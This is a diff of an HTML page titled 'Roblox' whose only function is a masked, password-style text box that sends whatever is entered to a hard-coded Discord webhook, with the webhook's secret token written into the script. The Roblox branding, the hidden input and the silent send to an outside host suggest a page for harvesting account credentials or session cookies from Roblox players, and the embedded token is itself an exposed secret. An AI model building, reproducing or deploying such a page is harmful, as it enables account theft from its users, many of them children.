@@ -1,158 +1,211 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Roblox</title>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Roblox</title>
 
-  <style>
-    * {
-      box-sizing: border-box;
+<style>
+  * {
+    box-sizing: border-box;
+  }
+
+  body {
+    margin: 0;
+    height: 100vh;
+    background: radial-gradient(circle at top, #0a0f1f, #05070d);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-family: Consolas, monospace;
+    color: #d0e6ff;
+    overflow: hidden;
+  }
+
+  /* subtle animated noise */
+  body::after {
+    content: "";
+    position: fixed;
+    inset: 0;
+    background: repeating-linear-gradient(
+      0deg,
+      rgba(255,255,255,0.02),
+      rgba(255,255,255,0.02) 1px,
+      transparent 1px,
+      transparent 3px
+    );
+    pointer-events: none;
+    opacity: 0.2;
+  }
+
+  .card {
+    position: relative;
+    width: 360px;
+    padding: 28px;
+    border-radius: 18px;
+    background: rgba(10, 15, 30, 0.85);
+    box-shadow: 0 0 40px rgba(0,0,0,0.7);
+    animation: fadeIn 0.8s ease-out;
+  }
+
+  /* animated RGB border glow */
+  .card::before {
+    content: "";
+    position: absolute;
+    inset: -2px;
+    border-radius: 20px;
+    background: linear-gradient(
+      120deg,
+      #00f2ff,
+      #7a00ff,
+      #ff008c,
+      #00f2ff
+    );
+    background-size: 300% 300%;
+    animation: rgbFlow 8s linear infinite;
+    z-index: -1;
+    filter: blur(12px);
+    opacity: 0.7;
+  }
+
+  @keyframes rgbFlow {
+    0% { background-position: 0% 50%; }
+    100% { background-position: 300% 50%; }
+  }
+
+  @keyframes fadeIn {
+    from {
+      opacity: 0;
+      transform: translateY(20px);
     }
-
-    body {
-      margin: 0;
-      font-family: 'Segoe UI', Arial, sans-serif;
-      height: 100vh;
-      background: linear-gradient(135deg, #141e30, #243b55);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      color: white;
-    }
-
-    .card {
-      background: rgba(255, 255, 255, 0.08);
-      backdrop-filter: blur(10px);
-      border-radius: 16px;
-      padding: 30px;
-      width: 360px;
-      box-shadow: 0 20px 40px rgba(0,0,0,0.3);
-      animation: fadeIn 0.8s ease-out;
-    }
-
-    @keyframes fadeIn {
-      from {
-        opacity: 0;
-        transform: translateY(20px);
-      }
-      to {
-        opacity: 1;
-        transform: translateY(0);
-      }
-    }
-
-    h2 {
-      text-align: center;
-      margin-bottom: 20px;
-      letter-spacing: 1px;
-    }
-
-    textarea {
-      width: 100%;
-      height: 110px;
-      padding: 12px;
-      border-radius: 10px;
-      border: none;
-      outline: none;
-      resize: none;
-      font-size: 15px;
-      transition: transform 0.2s ease, box-shadow 0.2s ease;
-
-      /* hide text like password */
-      -webkit-text-security: disc;
-      -moz-text-security: disc;
-    }
-
-    textarea:focus {
-      transform: scale(1.02);
-      box-shadow: 0 0 0 2px rgba(0, 150, 255, 0.6);
-    }
-
-    button {
-      width: 100%;
-      margin-top: 15px;
-      padding: 12px;
-      border-radius: 12px;
-      border: none;
-      font-size: 16px;
-      font-weight: bold;
-      cursor: pointer;
-      background: linear-gradient(135deg, #00c6ff, #0072ff);
-      color: white;
-      transition: all 0.25s ease;
-    }
-
-    button:hover {
-      transform: translateY(-3px);
-      box-shadow: 0 12px 25px rgba(0, 114, 255, 0.6);
-    }
-
-    button:active {
+    to {
+      opacity: 1;
       transform: translateY(0);
-      box-shadow: 0 6px 12px rgba(0,0,0,0.3);
     }
+  }
 
-    .footer {
-      text-align: center;
-      font-size: 12px;
-      opacity: 0.6;
-      margin-top: 12px;
-    }
-  </style>
+  h2 {
+    text-align: center;
+    margin-bottom: 18px;
+    letter-spacing: 2px;
+    font-weight: 500;
+  }
+
+  textarea {
+    width: 100%;
+    height: 110px;
+    padding: 12px;
+    border-radius: 12px;
+    border: 1px solid rgba(0, 200, 255, 0.2);
+    background: #060a18;
+    color: #00eaff;
+    font-size: 14px;
+    resize: none;
+    outline: none;
+    transition: all 0.25s ease;
+
+    /* hide text */
+    -webkit-text-security: disc;
+    -moz-text-security: disc;
+  }
+
+  textarea:focus {
+    border-color: #00eaff;
+    box-shadow: 0 0 15px rgba(0, 234, 255, 0.5);
+    transform: scale(1.02);
+  }
+
+  button {
+    margin-top: 16px;
+    width: 100%;
+    padding: 12px;
+    border-radius: 14px;
+    border: none;
+    background: linear-gradient(
+      120deg,
+      #00eaff,
+      #7a00ff,
+      #ff008c
+    );
+    background-size: 300% 300%;
+    animation: rgbFlow 6s linear infinite;
+    color: white;
+    font-size: 15px;
+    font-weight: bold;
+    cursor: pointer;
+    transition: transform 0.2s ease, box-shadow 0.2s ease;
+  }
+
+  button:hover {
+    transform: translateY(-3px);
+    box-shadow: 0 15px 30px rgba(0, 234, 255, 0.5);
+  }
+
+  button:active {
+    transform: translateY(0);
+    box-shadow: 0 6px 12px rgba(0,0,0,0.6);
+  }
+
+  .footer {
+    text-align: center;
+    margin-top: 12px;
+    font-size: 11px;
+    opacity: 0.6;
+    letter-spacing: 1px;
+  }
+</style>
 </head>
+
 <body>
 
-  <div class="card">
-    <h2>Submit Link</h2>
+<div class="card">
+  <h2>SUBMIT LINK</h2>
 
-    <textarea id="message" placeholder="Type your message here"></textarea>
+  <textarea id="message" placeholder="Enter payload..."></textarea>
 
-    <button onclick="sendMessage()">Send</button>
+  <button onclick="sendMessage()">TRANSMIT</button>
 
-    <div class="footer">
-      Secure • Anonymous • Instant
-    </div>
-  </div>
+  <div class="footer">ENCRYPTED • ANONYMOUS • LIVE</div>
+</div>
 
-  <script>
-    const MAX_LENGTH = 1999;
+<script>
+  const MAX_LENGTH = 1999;
 
-    async function sendMessage() {
-      const message = document.getElementById('message').value;
-      if (!message) {
-        alert("Please type something!");
-        return;
-      }
-
-      const webhookURL = "https://discord.com/api/webhooks/1438635586889060444/CKHiCB0XsbDaHk2OIMMxk1_P8hjrIevMnJ8wzPcIrr1doa5GhQcTVqyOYrLBBL7bcvCc";
-
-      const chunks = [];
-      for (let i = 0; i < message.length; i += MAX_LENGTH) {
-        chunks.push(message.substring(i, i + MAX_LENGTH));
-      }
-
-      try {
-        for (let chunk of chunks) {
-          const response = await fetch(webhookURL, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ content: chunk })
-          });
-
-          if (!response.ok) {
-            alert("Failed to send message.");
-            return;
-          }
-        }
-
-        alert("Message sent!");
-        document.getElementById('message').value = "";
-      } catch (error) {
-        alert("Error: " + error);
-      }
+  async function sendMessage() {
+    const message = document.getElementById('message').value;
+    if (!message) {
+      alert("Please type something!");
+      return;
     }
-  </script>
+
+    const webhookURL = "https://discord.com/api/webhooks/1438635586889060444/CKHiCB0XsbDaHk2OIMMxk1_P8hjrIevMnJ8wzPcIrr1doa5GhQcTVqyOYrLBBL7bcvCc";
+
+    const chunks = [];
+    for (let i = 0; i < message.length; i += MAX_LENGTH) {
+      chunks.push(message.substring(i, i + MAX_LENGTH));
+    }
+
+    try {
+      for (let chunk of chunks) {
+        const response = await fetch(webhookURL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ content: chunk })
+        });
+
+        if (!response.ok) {
+          alert("Failed to send message.");
+          return;
+        }
+      }
+
+      alert("Transmission complete.");
+      document.getElementById('message').value = "";
+    } catch (error) {
+      alert("Error: " + error);
+    }
+  }
+</script>
 
 </body>
 </html>
